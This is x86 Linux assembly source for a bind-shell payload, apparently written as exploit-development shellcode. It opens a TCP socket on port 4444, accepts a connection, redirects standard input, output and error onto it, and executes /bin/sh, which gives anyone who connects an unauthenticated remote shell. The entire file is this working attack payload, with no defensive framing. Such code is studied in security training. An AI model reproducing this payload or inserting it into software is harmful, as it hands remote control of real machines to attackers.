global _start

section .text
_start:
        ;create socket
        ;man tcp  tcp_socket = socket(AF_INET, SOCK_STREAM, 0);
        xor eax, eax
        mov al, 0x66    ; SYS_SOCKETCALL

        xor ebx, ebx
        mov bl, 1       ; SYS_SOCKET

        xor edx, edx
        push edx        ;push 0 TO THE STACK
        push 0x1        ;push SOCK_STREAM
        push 0x2        ;push AF_INET
        mov ecx, esp    ;save pointer
        int 0x80

        mov esi, eax    ;store values of socket_descriptor in esi to be used in the bind section "push esi"


        ;create bind
        ;bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
        xor eax, eax
        mov al, 0x66
        mov bl, 2        ;sockfd
        push edx         ;struct sockaddr
        push word 0x5c11 ; port 4444
        push word bx
        mov ecx, esp
        push 0x16
        push ecx
        push esi
        mov ecx, esp
        int 0x80

        ;listen
        mov al, 0x66
        xor ebx, ebx
        mov bx, 4
        push ebx
        push esi
        mov ecx, esp
        int 0x80

        ;accept
        mov al, 0x66
        inc ebx
        push edx
        push edx
        push esi
        mov ecx, esp
        int 0x80

        ;dup2
        ;dup2(int oldfd, int newfd)
        mov ebx, eax
        xor eax, eax
        xor ecx, ecx
        mov al, 0x3F    ;dup2 syscall 63d=3Fh
        int 0x80
        mov al, 0x3F
        add ecx, 1
        int 0x80
        mov al, 0x3F
        add ecx, 1
        int 0x80

        ;execve
        xor eax, eax
        push eax

        push 0x68732f6e
        push 0x69622f2f

        mov ebx, esp

        push eax
        mov edx, esp

        push ebx
        mov ecx, esp

        mov al, 11
        int 0x80

